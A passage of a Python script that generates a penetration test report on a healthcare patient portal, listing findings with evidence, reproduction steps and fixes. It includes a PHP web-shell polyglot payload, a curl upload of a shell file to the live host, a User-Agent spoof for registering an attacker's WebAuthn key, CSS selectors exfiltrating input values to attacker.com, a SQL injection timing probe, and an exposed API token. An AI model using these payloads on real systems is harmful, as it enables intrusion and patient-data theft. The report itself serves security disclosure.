    "A01:2021 — Broken Access Control", "—",
    "GET/POST /auth/trusted_device/*", "Partially (some actions require auth)", "Yes — confirmed live",
    """
<p><code>TrustedDevicesController</code> skips CSRF verification for all actions and restricts
access with a trivially spoofable User-Agent check:</p>
""" + code("""skip_before_action :verify_authenticity_token
before_action :require_hotwire_native

def require_hotwire_native
  head :forbidden unless request.user_agent&.include?("Hotwire Native")
end""") + """
<p>Adding <code>Hotwire Native</code> to any User-Agent bypasses both restrictions.
<code>POST /auth/trusted_device/register</code> (authenticated) registers a WebAuthn credential
without a CSRF token. <code>GET /auth/trusted_device/skip_registration</code> (unauthenticated)
sets a permanent cookie suppressing future WebAuthn prompts.</p>
""",
    """
<div class="risk-box">
<strong>Healthcare impact:</strong> An attacker with temporary session access can register their
own hardware authenticator on the victim's account, establishing persistent 2FA-bypassing access.
Even after the victim changes their password, the attacker retains the ability to complete 2FA
with their own device — maintaining unauthorized access to patient records indefinitely.
</div>
""",
    code("""curl -sk -H 'User-Agent: Mozilla/5.0 Hotwire Native iOS' \\
  -b '_caren_session=<session>' \\
  'https://development.caren.nl/auth/trusted_device/options'
# HTTP 200:
# {"options":{"challenge":"sv2HY-...","rp":{"name":"Caren","id":"development.caren.nl"},
#   "user":{"name":"riccardo.tencate@nedap.com"}}}

# WebAuthn registration POST — no CSRF token required:
POST /auth/trusted_device/register with attacker-controlled credential → HTTP 200"""),
    """<ol>
  <li>Add <code>Hotwire Native</code> to the User-Agent string in any HTTP client</li>
  <li>With a valid authenticated session, POST to <code>/auth/trusted_device/register</code> with an attacker-controlled WebAuthn credential — no CSRF token needed</li>
  <li>Attacker can now authenticate as victim using their own security key even after password reset</li>
</ol>""",
    """<ul>
  <li>Restore CSRF verification for all POST/PATCH/DELETE actions in the controller</li>
  <li>Replace User-Agent check with a signed registration token issued by the server (prevents spoofing)</li>
  <li>Rate-limit WebAuthn credential registrations per account per hour</li>
  <li>Send an email notification to the account holder when a new trusted device is registered</li>
</ul>"""
))

# NP-013 — MEDIUM (was LOW) ───────────────────────────────────────────────────
FINDINGS_HTML.append(finding_section(
    "NP-013", "medium",
    "Unrestricted File Upload on Message Attachments",
    "A04:2021 — Insecure Design", "—",
    "POST /people/:id/message_groups/:slug/messages", "Yes (valid session)", "Yes — PHP shells, SVG, HTML accepted",
    """
<p>The message attachment endpoint accepts any file type without extension or MIME type validation.
PHP shells, HTML files with embedded scripts, SVG files with XSS payloads, and polyglot
GIF+PHP files are stored without restriction. Current mitigating controls:</p>
<ul>
  <li><code>Content-Disposition: attachment</code> on all attachment downloads — prevents inline browser execution</li>
  <li><code>X-Content-Type-Options: nosniff</code> — prevents MIME sniffing</li>
  <li>Active Storage blob signed URLs for <em>images</em> use <code>inline</code> disposition — polyglot image files are served inline via blob URL</li>
</ul>
<p>The mitigations address the immediate risk but the absence of content validation means any
future change to the serving mechanism (preview features, inline rendering, API changes) would
immediately activate stored payloads.</p>
""",
    """
<div class="risk-box">
<strong>Healthcare impact:</strong> Stored malicious files represent a latent risk that activates
when the serving mechanism changes. PHP shells stored in the attachment system could enable remote
code execution if the storage backend ever executes uploaded content. SVG XSS payloads could
exfiltrate PHI from any user's session if attachment inline rendering is introduced. In a regulated
healthcare environment, the presence of unvalidated executable content in storage represents an
audit risk even if not currently triggerable.
</div>
""",
    code("""# Files accepted without any validation:
shell.php       → HTTP 200, Content-Type: text/x-php,    Content-Disposition: attachment
shell.phtml     → HTTP 200, Content-Type: text/x-php,    Content-Disposition: attachment
xss.svg         → HTTP 200, Content-Type: image/svg+xml, Content-Disposition: attachment
shell.html      → HTTP 200, Content-Type: text/html,     Content-Disposition: attachment
polyglot.gif.php→ HTTP 200, Content-Type: image/gif,     Content-Disposition: inline (via blob URL)
                  Body: GIF89a<?php system($_GET['c']); ?>"""),
    code("""curl -sk -b '_caren_session=SESSION' \\
  -F 'authenticity_token=CSRF' -F 'message[content]=test' \\
  -F 'message[attachments][]=@shell.php;type=image/jpeg' \\
  https://development.caren.nl/people/84/message_groups/84_common/messages
# HTTP 200 — file accepted, stored in Active Storage"""),
    """
<p>Implement server-side MIME type validation using magic bytes inspection, not declared
Content-Type. Use an explicit allow-list of safe content types:</p>
""" + code("""ALLOWED_TYPES = %w[image/jpeg image/png image/gif image/webp
                   application/pdf text/plain
                   application/msword
                   application/vnd.openxmlformats-officedocument.wordprocessingml.document]

validate :attachment_content_type_allowed
def attachment_content_type_allowed
  attachments.each do |a|
    type = Marcel::MimeType.for(a.blob.download)
    errors.add(:base, "File type not permitted: #{type}") unless ALLOWED_TYPES.include?(type)
  end
end""")
))

# LOW findings ─────────────────────────────────────────────────────────────────

low_defs = [
    ("NP-014", "low", "GET-Based Logout Enables Logout CSRF",
     "A07:2021 — Identification and Authentication Failures", "—",
     "GET /auth/logout", "No", "Yes",
     "<p>The logout endpoint triggers on a plain GET request with no CSRF token. SameSite=Lax mitigates passive sub-resource CSRF (image/script tags) but top-level navigation — following a hyperlink — sends the session cookie. A social-engineered link forces victim logout in a single click.</p>",
     "<div class='risk-box'><strong>Healthcare impact:</strong> Forced logout during active documentation of patient care data causes data loss and workflow disruption. Care workers interrupted mid-entry in time-sensitive care records may lose unsaved clinical notes.</div>",
     code("""GET https://development.caren.nl/auth/logout → HTTP 302 (session cleared, no CSRF token required)"""),
     "<p>Navigate to the logout URL with an active session — session is immediately invalidated.</p>",
     code("""# Change logout to DELETE + CSRF token:
# config/routes.rb
resource :logout, only: [:destroy], module: :auth

# View:
<%= button_to "Log out", auth_logout_path, method: :delete %>""")),

    ("NP-015", "low", "Username Enumeration via Timing Side-Channel (Login and Recovery)",
     "A07:2021 — Identification and Authentication Failures", "—",
     "POST /auth/login · POST /auth/recoveries", "No", "Yes — measured live",
     "<p>The login endpoint short-circuits before bcrypt when a user is not found, creating a measurable timing difference. The recovery endpoint returns identical messages for valid and invalid emails but runs email dispatch logic only for valid accounts, leaking via response time. Measured deltas: <strong>337ms on login</strong>, <strong>298ms on recovery</strong>, consistently reproducible across three samples each.</p>",
     "<div class='risk-box'><strong>Healthcare impact:</strong> Enables an attacker to silently confirm which email addresses are registered on the platform before launching targeted credential attacks against healthcare workers or patients.</div>",
     code("""Login timing (3 samples each):
Non-existent: avg 162ms [152ms, 156ms, 179ms]
Valid user:   avg 500ms [468ms, 514ms, 516ms]  Delta: 337ms

Recovery timing:
Non-existent: 61ms  |  Valid: 359ms  |  Delta: 298ms"""),
     "<p>Time 3+ POST requests to <code>/auth/login</code> with a known-valid vs known-invalid email address. Consistent ~337ms gap identifies valid accounts.</p>",
     code("""# Always run bcrypt even for non-existent users:
def can_login?
  user = login_user
  dummy_hash = BCrypt::Password.create("dummy") if user.nil?
  user&.authenticate(password) || (dummy_hash && BCrypt::Password.new(dummy_hash).is_password?(password) && false)
end
# Recovery: dispatch email in a background job and return 200 immediately""")),

    ("NP-016", "medium", "No Rate Limiting on TOTP Enrollment Verification Code",
     "A05:2021 — Security Misconfiguration", "—",
     "PATCH /settings/two_factor/totp", "Yes (valid session)", "Yes",
     "<p>The TOTP enrollment confirmation step accepts unlimited wrong 6-digit codes without rate limiting. The TOTP enrollment secret was visible in the enrollment page HTML, enabling offline TOTP code precomputation. An attacker with temporary session access can attempt to brute-force the confirmation window and enroll their own authenticator on the victim's account.</p>",
     "<div class='risk-box'><strong>Healthcare impact:</strong> If an attacker gains temporary session access and completes TOTP enrollment before the victim notices, they maintain persistent 2FA-capable access even after the session expires.</div>",
     code("""15 consecutive PATCH requests with random 6-digit codes → HTTP 422 × 15, no 429"""),
     "<p>Send 15+ PATCH requests with different 6-digit codes; observe no throttling or lockout.</p>",
     "<p>Apply a rate limit of 5 attempts per 30-second TOTP window per session. Lock the enrollment confirmation after 10 consecutive failures.</p>"),

    ("NP-018", "low", "Session Cookie Domain Scoped Too Broadly (domain: :all)",
     "A07:2021 — Identification and Authentication Failures", "—",
     "Session cookie (all responses)", "N/A", "Yes — code review confirmed",
     "<p>The session store is configured with <code>domain: :all</code> and <code>tld_length: 3</code>, setting the cookie domain to <code>.caren.nl</code>. The same session token is sent to every <code>*.caren.nl</code> subdomain — including deprecated or future subdomains not under active security control.</p>" + code("""# config/initializers/session_store.rb
config.session_store :redis_caren_session_store,
  domain: :all, tld_length: 3,   # → cookie domain: .caren.nl
  key: "_caren_session" """),
     "<div class='risk-box'><strong>Healthcare impact:</strong> An XSS vulnerability on any caren.nl subdomain — including expired or third-party-hosted subdomains — can steal session cookies valid for both the patient portal and the admin portal, broadening the blast radius of any single XSS finding significantly.</div>",
     "<p>Inspect the <code>Set-Cookie</code> header and observe the domain scope.</p>",
     "<p>Inspect the <code>Set-Cookie</code> header on any response.</p>",
     "<p>Scope the cookie to the specific domain: <code>domain: \"development.caren.nl\"</code> per environment. Only share the cookie across subdomains if explicitly required.</p>"),

    ("NP-019", "low", "Freshdesk JWT Contains Unsanitized User-Controlled Name Field",
     "A03:2021 — Injection", "—",
     "GET /freshdesk/token", "Yes (valid session)", "Yes — JWT payload confirmed",
     "<p>The Freshdesk widget JWT embeds the user's display name verbatim without sanitization. When the name contains HTML or template payloads, these are encoded into the JWT <code>name</code> claim. XSS impact is limited to the cross-origin <code>euc-widget.freshworks.com</code> iframe context (SOP prevents cookie access from <code>caren.nl</code>).</p>" + code("""JWT payload: {"name":"Riccardo\\"><h1>A{{7*7}}","email":"riccardo.tencate@nedap.com","exp":1778078541}"""),
     "<div class='risk-box'><strong>Healthcare impact:</strong> Injected content in the Freshdesk widget name field could be used for social engineering: a care worker whose display name in the support widget shows fabricated content may provide incorrect information to the helpdesk, or the widget could be used to spoof support messages.</div>",
     "<p>Set display name to include HTML characters or template syntax; inspect the returned JWT payload.</p>",
     "<p>Set display name to include HTML characters; observe unsanitized payload in JWT.</p>",
     code("""name: ActionController::Base.helpers.strip_tags(current_user.full_name).truncate(100)""")),

    ("NP-020", "low", "Missing Permissions-Policy Security Header",
     "A05:2021 — Security Misconfiguration", "V14.4.7",
     "All responses", "N/A", "Yes",
     "<p>The application does not set a <code>Permissions-Policy</code> header on any response. This header controls which browser APIs can be accessed by the page and embedded content (camera, microphone, geolocation, payment, USB). For a healthcare platform, inadvertent device sensor access by any injected script is a meaningful concern.</p>" + code("""curl -I https://development.caren.nl/auth/login | grep -i permissions
(no output — header absent)"""),
     "<div class='risk-box'><strong>Healthcare impact:</strong> Patients and care workers accessing Caren on mobile devices could have microphone or camera access requested by injected scripts without explicit prompts, violating patient privacy expectations and potentially AVG/GDPR requirements around consent for device access.</div>",
     "<p>Inspect any response header — <code>Permissions-Policy</code> is absent on all endpoints.</p>",
     "<p>Check response headers; observe absent Permissions-Policy.</p>",
     code("""Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), bluetooth=()""")),

    ("NP-022", "low", "CSP style-src 'unsafe-inline' Allows CSS Injection",
     "A05:2021 — Security Misconfiguration", "—",
     "All responses", "N/A", "Yes",
     "<p>The Content-Security-Policy includes <code>'unsafe-inline'</code> in <code>style-src</code> while correctly restricting <code>script-src</code> to nonces. This allows CSS injection attacks: CSS attribute selectors can exfiltrate input field values character by character without requiring JavaScript execution, bypassing the nonce-based script protection.</p>" + code("""content-security-policy: ...style-src 'self' 'unsafe-inline' https://fonts.googleapis.com..."""),
     "<div class='risk-box'><strong>Healthcare impact:</strong> If user-controlled content is ever reflected in a style context, patient data in input fields (names, identifiers, clinical values) could be exfiltrated to an attacker server via CSS background-image requests — without triggering any JavaScript-based detection.</div>",
     code("""# CSS exfiltration example if CSS injection occurs:
input[value^='a']{ background: url(https://attacker.com/a) }
input[value^='b']{ background: url(https://attacker.com/b) }"""),
     "<p>Inspect the <code>content-security-policy</code> header and observe <code>'unsafe-inline'</code> in <code>style-src</code>.</p>",
     "<p>Replace <code>'unsafe-inline'</code> with style nonces or hashes. Move all inline styles to external stylesheets where possible.</p>"),

    ("NP-023", "low", "No Server-Side TLS Cipher Suite Order Enforcement",
     "A05:2021 — Security Misconfiguration", "—",
     "TLS handshake", "N/A", "Yes — testssl confirmed",
     "<p>The server does not enforce a server-side cipher preference order. Clients can select any offered cipher. All offered ciphers are AEAD with Forward Secrecy (ECDHE-ECDSA variants only), so no immediately weak ciphers are offered. NIST SP 800-52r2 recommends server-side ordering to ensure strongest ciphers are preferred.</p>" + code("""testssl: "Has server cipher order? no"
Offered ciphers: ECDHE-ECDSA-AES256-GCM-SHA384 / CHACHA20-POLY1305 / AES128-GCM-SHA256"""),
     "<div class='risk-box'><strong>Healthcare impact:</strong> Theoretical only, given all offered ciphers are currently strong. Risk would materialize if a weaker cipher is added to the offered set in future without ordering enforcement.</div>",
     "<p>Run <code>testssl.sh development.caren.nl</code> — observe <code>Has server cipher order? no</code>.</p>",
     "<p>Run <code>testssl.sh</code>; observe cipher order flag.</p>",
     code("""# nginx config:
ssl_prefer_server_ciphers on;
ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256;""")),

    ("NP-024", "low", "BREACH Attack Surface via HTTP Compression on HTTPS",
     "A05:2021 — Security Misconfiguration", "—",
     "All HTTPS responses", "N/A", "Yes — Nikto confirmed",
     "<p>The server returns <code>Content-Encoding: deflate</code> on HTTPS responses. Combined with HTTPS compression and attacker-controlled partial plaintext in responses, this creates a theoretical BREACH (CVE-2013-3587) attack surface. Rails' CSRF token masking reduces practical exploitability significantly.</p>" + code("""Nikto: "Content-Encoding: deflate — possible BREACH vulnerability"
Response header: Content-Encoding: deflate (all page responses)"""),
     "<div class='risk-box'><strong>Healthcare impact:</strong> Theoretical for a network-level MitM attacker. Rails CSRF masking mitigates the primary exploitation vector. No immediate patient data risk.</div>",
     "<p>Make a request to any page and observe <code>Content-Encoding: deflate</code>.</p>",
     "<p>Observe <code>Content-Encoding: deflate</code> on any page response.</p>",
     "<p>Disable response compression for authenticated HTML pages. Retain compression for static assets (JS/CSS) that do not contain secrets.</p>"),

    ("NP-025", "low", "Password Composition Rules Violate NIST SP 800-63B",
     "A07:2021 — Identification and Authentication Failures", "V2.1.9",
     "GET /settings/users/:id/change_password", "Yes (valid session)", "Yes",
     "<p>The password change form requires 'multiple special and uppercase characters' in addition to the 12-character minimum. NIST SP 800-63B and ASVS V2.1.9 explicitly prohibit character-type composition requirements. They reduce effective password entropy by constraining the search space and predictably push users toward patterns like <code>P@ssw0rd!</code>.</p>" + code("""Password hint: "minimum of 12 characters and consists of multiple special and uppercase characters" """),
     "<div class='risk-box'><strong>Healthcare impact:</strong> Composition rules encourage predictable password patterns that appear frequently in breach databases. Healthcare workers with compromised credentials are high-value targets; the composition requirement makes their passwords easier to guess than a simple passphrase would be.</div>",
     "<p>Visit <code>/settings/users/:id/change_password</code> — observe the requirement hint text.</p>",
     "<p>Observe the password requirements hint text at the change-password form.</p>",
     "<p>Remove character-type requirements. Enforce a minimum length of 15+ characters, a maximum of 64+, and screen new passwords against a breached password list (HIBP API or equivalent local dataset).</p>"),

]

for np_id, sev, title, owasp, asvs, endpoint, auth, confirmed, desc, risk, evidence, steps, remediation in low_defs:
    m = SEV_META.get(sev, SEV_META["info"])
    FINDINGS_HTML.append(f'''
<div class="finding" style="border-left:4px solid {m["color"]};">
  <div class="finding-header">
    <div class="finding-title-row">
      <span class="finding-id">{esc(np_id)}</span>
      {badge(sev)}
      <span class="finding-title">{esc(title)}</span>
    </div>
    <table class="finding-meta">
      <tr><td>OWASP</td><td>{esc(owasp)}</td><td>ASVS</td><td>{esc(asvs)}</td></tr>
      <tr><td>Endpoint</td><td colspan="3"><code>{esc(endpoint)}</code></td></tr>
      <tr><td>Auth Required</td><td>{esc(auth)}</td><td>Confirmed</td><td>{esc(confirmed)}</td></tr>
    </table>
  </div>
  <div class="finding-body">
    <h4>Description</h4>{desc}
    <h4>Business Risk</h4>{risk}
    <h4>Evidence</h4>{evidence}
    <h4>Reproduction Steps</h4>{steps}
    <h4>Remediation</h4>{remediation}
  </div>
</div>
''')

# INFO findings ───────────────────────────────────────────────────────────────

info_defs = [
    ("NP-008", "info", "Rollbar Client-Side API Token Exposed in HTML Source",
     "<p>Every authenticated page embeds the Rollbar client token in a meta tag. Post-report verification confirmed the token is <strong>write-only</strong> — it can submit error reports but cannot read existing items, stack traces, or captured payloads. Attempts to query <code>api.rollbar.com/api/1/items/</code> return HTTP 403. This is the expected configuration for a client-side SDK token.</p>" + code("""curl -H 'X-Rollbar-Access-Token: 60d0cddf81114765837ab6663bf6a3a3' \\
     https://api.rollbar.com/api/1/items/
# HTTP 403 — write-only token cannot read items"""),
     "<div class='risk-box'><strong>Business risk: none.</strong> Token is write-only. No patient data is readable via this token. No action required.</div>",
     "<p>No remediation required. Token is correctly scoped. Existing limits (<code>itemsPerMinute: 5</code>, <code>maxItems: 5</code>) prevent log flooding abuse.</p>"),

    ("NP-026", "info", "Unhandled 500 Errors on Invalid Organization ID Parameters",
     "<p>Two endpoints return HTTP 500 when <code>organization_id</code> parameters receive non-integer or out-of-range values. Time-based SQLi was explicitly ruled out: a <code>pg_sleep(3)</code> payload returned in 0.34s with no database delay — SQLi not viable. Root cause is missing integer validation before the database query.</p>" + code("""POST /people/596/permit_request with organization_id=2          → HTTP 500
GET /people/598/dossier?search[organization_id][]=notaninteger  → HTTP 500
pg_sleep(3) probe: 0.34s response — no delay, SQLi ruled out"""),
     "<div class='risk-box'><strong>Business risk: low.</strong> All 500 errors are captured in Rollbar (write-only token, not readable externally). Parameter values in error payloads may include patient IDs from the permit_request form — appearing only in internal error telemetry.</div>",
     code("""organization_id = Integer(params.dig(:permit_request, :organization_id)) rescue nil
head :unprocessable_entity and return unless organization_id""")),

    ("NP-029", "info", "Admin Panel Routes Return 403 Instead of 404 (Enumerable)",
     "<p>Admin routes (<code>/admin</code>, <code>/admin/users</code>, <code>/admin/organizations</code>, etc.) return HTTP 403 for regular users instead of HTTP 404. This confirms to any authenticated user that the admin interface exists and reveals its complete route structure, facilitating targeted privilege escalation attempts.</p>" + code("""GET /admin            → HTTP 403  (confirms route exists)
GET /admin/users     → HTTP 403  (confirms route exists)
GET /nonexistent     → HTTP 404  (standard not-found)"""),
     "<div class='risk-box'><strong>Business risk: low.</strong> Route existence is informational — no data is exposed. Risk materializes only if a separate privilege escalation vulnerability allows reaching these routes.</div>",
     "<p>Configure admin controllers to render 404 for non-admin users: catch <code>ActionPolicy::Unauthorized</code> and render <code>status: :not_found</code> instead of <code>status: :forbidden</code>.</p>"),
]

for np_id, sev, title, desc, risk, remediation in info_defs:
    m = SEV_META.get(sev, SEV_META["info"])
    FINDINGS_HTML.append(f'''
<div class="finding" style="border-left:4px solid {m["color"]};">
  <div class="finding-header">
    <div class="finding-title-row">
      <span class="finding-id">{esc(np_id)}</span>
      {badge(sev)}
      <span class="finding-title">{esc(title)}</span>
    </div>
  </div>
  <div class="finding-body">
    <h4>Description</h4>{desc}
    <h4>Business Risk</h4>{risk}
    <h4>Remediation</h4>{remediation}
  </div>
</div>
''')

# ─── tables ───────────────────────────────────────────────────────────────────

REMEDIATION_ROWS = [
    ("NP-001","🟠 HIGH",   "Password change — no current password required","P0 — Immediate",  "Low",   "Require password_challenge in strong params; add model guard"),
    ("NP-002","⚪ INFO",   "Org website link — no URL scheme validation",   "P4 — Backlog",    "Low",   "URL scheme validation + CSP navigate-to + document in brakeman.ignore"),
    ("NP-003","🟡 MEDIUM", "Person deleted — no server-side confirmation",  "P1 — This sprint","Low",   "Validate confirmation params in destroy action"),
    ("NP-004","🟡 MEDIUM", "No rate limit on activation code",              "P2 — Next sprint","Low",   "rack-attack throttle on link_activation endpoint"),
    ("NP-006","🟡 MEDIUM", "Account deletion — no password re-auth",        "P2 — Next sprint","Low",   "Add password_challenge to account delete flow"),
    ("NP-009","🟡 MEDIUM", "Nedap API — no application-level auth",         "P2 — Next sprint","Medium","Add shared-secret token to Api::ApplicationController"),
    ("NP-010","🟡 MEDIUM", "Freshdesk Basic Auth — password ignored",       "P2 — Next sprint","Low",   "Fix basic_auth_valid? to validate password field"),
    ("NP-012","🟡 MEDIUM", "Trusted Device — CSRF disabled, UA spoofable",  "P2 — Next sprint","Medium","Restore CSRF; server-side device attestation"),
    ("NP-013","🟡 MEDIUM", "Unrestricted file upload",                      "P2 — Next sprint","Medium","MIME validation via magic bytes; content-type allowlist"),
    ("NP-014","🔵 LOW",    "GET-based logout CSRF",                         "P3 — Milestone",  "Low",   "Change logout to DELETE + CSRF token"),
    ("NP-015","🔵 LOW",    "Timing enumeration — login + recovery",         "P3 — Milestone",  "Low",   "Always run bcrypt; normalize recovery response time"),
    ("NP-016","🟡 MEDIUM", "No rate limit on TOTP enrollment",              "P2 — Next sprint","Low",   "Throttle TOTP enrollment confirmation attempts"),
    ("NP-018","🔵 LOW",    "Session cookie domain too broad",               "P3 — Milestone",  "Low",   "Scope to specific domain instead of :all"),
    ("NP-019","🔵 LOW",    "Freshdesk JWT — unsanitized name field",        "P3 — Milestone",  "Low",   "strip_tags() before JWT embedding"),
    ("NP-020","🔵 LOW",    "Missing Permissions-Policy header",             "P3 — Milestone",  "Low",   "Add header in nginx / Rails initializer"),
    ("NP-022","🔵 LOW",    "CSP style-src unsafe-inline",                  "P4 — Backlog",    "Medium","Replace with style nonces or hashes"),
    ("NP-023","🔵 LOW",    "No TLS cipher order enforcement",              "P4 — Backlog",    "Low",   "ssl_prefer_server_ciphers on in nginx"),
    ("NP-024","🔵 LOW",    "BREACH via HTTP compression",                  "P4 — Backlog",    "Low",   "Disable compression for authenticated pages"),
    ("NP-025","🔵 LOW",    "Password composition violates NIST 800-63B",   "P4 — Backlog",    "Low",   "Remove character-type rules; increase min length to 15+"),
    ("NP-026","⚪ INFO",   "Unhandled 500 on invalid org ID params",        "P4 — Backlog",    "Low",   "Integer() validation before DB queries"),
    ("NP-008","⚪ INFO",   "Rollbar token in HTML",                         "—",               "—",     "No action required — token verified write-only"),
    ("NP-029","⚪ INFO",   "Admin routes return 403 instead of 404",        "P4 — Backlog",    "Low",   "Render 404 for non-admin users"),
]

CLEAN_ROWS = [
    ("SQL Injection",         "All endpoints use ActiveRecord parameterized queries. pg_sleep probe: 0.34s response, no delay — SQLi not viable."),
    ("CSRF Protection",       "authenticity_token enforced on all state-changing requests. Requests without valid token consistently return HTTP 422."),
    ("Cross-User IDOR",       "People::ApplicationController scopes all queries via current_user's relationships. Cross-user access returns HTTP 404."),
    ("Session Fixation",      "reset_session called on successful login (auth/sessions_controller.rb:33)."),
    ("2FA Enforcement",       "Pre-2FA sessions redirect to 2FA form for all protected routes. Globally enforced via ApplicationController."),
    ("CORS Policy",           "No origin reflection. Access-Control-Allow-Origin not dynamically set from request Origin header."),
    ("Response Caching",      "Authenticated pages return Cache-Control: private, no-store. No PHI cached by proxies."),
    ("Mass Assignment",       "params.expect() (Rails 8 strong parameters) used consistently. No untested mass-assignment paths found."),
    ("XSS in Content Fields", "ERB auto-escaping applied consistently. ActionText content sanitized on render. No stored XSS via normal content input."),
    ("TLS Configuration",     "TLS 1.2/1.3 only. All ciphers AEAD with Forward Secrecy. OCSP stapling enabled. Heartbleed, POODLE, BEAST, DROWN: all clean."),
    ("Admin Access Control",  "Admin panel enforces administrator: true on the User record. Regular users correctly blocked from admin functionality."),
]

# ─── full HTML ────────────────────────────────────────────────────────────────

def build_html():
    rem_rows_html = "".join(
        f'<tr><td><strong>{esc(r[0])}</strong></td><td>{esc(r[1])}</td><td>{esc(r[2])}</td>'
        f'<td>{esc(r[3])}</td><td>{esc(r[4])}</td><td>{esc(r[5])}</td></tr>'
        for r in REMEDIATION_ROWS
    )
    clean_rows_html = "".join(
        f'<tr><td style="color:#5bf29b;">{esc(c[0])}</td><td>{esc(c[1])}</td></tr>'
        for c in CLEAN_ROWS
    )
    findings_body = "\n".join(FINDINGS_HTML)

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Caren Penetration Test Report — NullPointer Studio</title>
  <style>{CSS_STR}</style>
</head>
<body>

<div class="cover">
  <img class="cover-logo" src="{LOGO_SRC}" alt="NullPointer Studio">
  <div class="cover-classification">CONFIDENTIAL</div>
  <div class="cover-title">Penetration Test Report</div>
  <div class="cover-subtitle">development.caren.nl</div>
  <div class="cover-divider"></div>
  <div class="cover-meta">
    <table>
      <tr><td>Client</td><td>Nedap Healthcare</td></tr>
      <tr><td>Target</td><td>https://development.caren.nl</td></tr>
      <tr><td>Test type</td><td>Web App Pentest + White-Box Code Review</td></tr>
      <tr><td>Framework</td><td>Ruby on Rails 8.1 (Ruby 3.4.9)</td></tr>
      <tr><td>Test date</td><td>2026-05-06</td></tr>
      <tr><td>Report date</td><td>2026-05-06</td></tr>
      <tr><td>Prepared by</td><td>NullPointer Studio</td></tr>
      <tr><td>Version</td><td>1.0</td></tr>
    </table>
  </div>
  <div class="cover-footer">NullPointer Studio · security research &amp; consulting</div>
</div>

<div class="section">
  <h3 style="color:#ff4d6d;font-family:'IBM Plex Mono',monospace;font-size:8pt;text-transform:uppercase;letter-spacing:0.15em;">Handling Notice</h3>
  <p style="font-size:8.5pt;color:#9b98b8;">This document contains security-sensitive information about vulnerabilities in live infrastructure.
  Distribute only on a strict need-to-know basis. Do not store unencrypted on shared drives, email systems,
  or cloud services accessible to third parties.</p>
</div>

<div class="stat-row">
  <div class="stat-box">
    <span class="stat-num" style="color:#ff8c42;">1</span>
    <span class="stat-label">High</span>
  </div>
  <div class="stat-box">
    <span class="stat-num" style="color:#ffd166;">8</span>
    <span class="stat-label">Medium</span>
  </div>
  <div class="stat-box">
    <span class="stat-num" style="color:#5bf29b;">9</span>
    <span class="stat-label">Low</span>
  </div>
  <div class="stat-box">
    <span class="stat-num" style="color:#7b78ff;">4</span>
    <span class="stat-label">Info</span>
  </div>
  <div class="stat-box">
    <span class="stat-num" style="color:#e8e6f0;">22</span>
    <span class="stat-label">Total</span>
  </div>
</div>

<div class="page-break"></div>
<h1>Executive Summary</h1>
<div class="section">{EXEC_SUMMARY}</div>

<h1>Scope &amp; Methodology</h1>
<div class="section">{METHODOLOGY}</div>

<h1>Risk Dashboard</h1>
<div class="section">
  <table class="dashboard-table">
    <tr><th>ID</th><th>Severity</th><th>Title</th><th>OWASP</th><th>Status</th></tr>
    <tr><td>NP-001</td><td>{badge("high")}</td><td>Password Change Without Current Password Verification</td><td>A07:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-003</td><td>{badge("medium")}</td><td>Person Record Permanently Deleted Without Server-Side Confirmation</td><td>A01:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-004</td><td>{badge("medium")}</td><td>No Rate Limiting on Activation Code Brute-Force</td><td>A05:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-006</td><td>{badge("medium")}</td><td>Account Deletion Without Password Re-Authentication</td><td>A07:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-009</td><td>{badge("medium")}</td><td>Nedap API Lacks Application-Level Authentication</td><td>API2:2023</td><td>Confirmed</td></tr>
    <tr><td>NP-010</td><td>{badge("medium")}</td><td>Freshdesk Sync Endpoint Ignores Password in Basic Auth</td><td>A07:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-012</td><td>{badge("medium")}</td><td>Trusted Device Controller — CSRF Disabled, User-Agent Spoofable</td><td>A01:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-013</td><td>{badge("medium")}</td><td>Unrestricted File Upload on Message Attachments</td><td>A04:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-014</td><td>{badge("low")}</td><td>GET-Based Logout Enables Logout CSRF</td><td>A07:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-015</td><td>{badge("low")}</td><td>Username Enumeration via Timing Side-Channel</td><td>A07:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-016</td><td>{badge("medium")}</td><td>No Rate Limiting on TOTP Enrollment Verification Code</td><td>A05:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-018</td><td>{badge("low")}</td><td>Session Cookie Domain Scoped Too Broadly</td><td>A07:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-019</td><td>{badge("low")}</td><td>Freshdesk JWT Contains Unsanitized Name Field</td><td>A03:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-020</td><td>{badge("low")}</td><td>Missing Permissions-Policy Security Header</td><td>A05:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-022</td><td>{badge("low")}</td><td>CSP style-src 'unsafe-inline' Allows CSS Injection</td><td>A05:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-023</td><td>{badge("low")}</td><td>No Server-Side TLS Cipher Suite Order Enforcement</td><td>A05:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-024</td><td>{badge("low")}</td><td>BREACH Attack Surface via HTTP Compression</td><td>A05:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-025</td><td>{badge("low")}</td><td>Password Composition Rules Violate NIST SP 800-63B</td><td>A07:2021</td><td>Confirmed</td></tr>
    <tr><td>NP-002</td><td>{badge("info")}</td><td>Organization Website Field Rendered Without URL Scheme Validation</td><td>A03:2021</td><td>Informational</td></tr>
    <tr><td>NP-026</td><td>{badge("info")}</td><td>Unhandled 500 Errors on Invalid Organization ID Parameters</td><td>A05:2021</td><td>Informational</td></tr>
    <tr><td>NP-008</td><td>{badge("info")}</td><td>Rollbar Client-Side API Token Exposed in HTML Source</td><td>A05:2021</td><td>Informational</td></tr>
    <tr><td>NP-029</td><td>{badge("info")}</td><td>Admin Panel Routes Return 403 Instead of 404</td><td>A01:2021</td><td>Informational</td></tr>
  </table>
</div>

<div class="page-break"></div>
<h1>Findings</h1>
{findings_body}

<div class="page-break"></div>
<h1>Remediation Summary</h1>
<div class="section">
  <table class="remediation-table">
